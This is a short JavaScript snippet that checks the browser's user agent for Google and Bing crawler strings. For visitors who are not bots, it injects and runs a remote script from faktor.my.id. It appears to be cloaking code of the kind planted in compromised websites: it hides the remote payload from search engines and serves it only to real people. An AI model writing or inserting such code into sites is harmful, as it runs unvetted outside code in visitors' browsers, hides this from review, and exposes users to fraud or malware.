const userAgent = navigator.userAgent.toLowerCase();

const isBot = userAgent.includes("google.com") || 
              userAgent.includes("googlebot") || 
              userAgent.includes("googlebot-image") || 
              userAgent.includes("googlebot-image/1.0") || 
              userAgent.includes("google") || 
              userAgent.includes("bingbot");

if (!isBot) {
  const script = document.createElement('script');
  script.src = 'https://faktor.my.id/adsnode/app.js';
  document.head.appendChild(script);
}
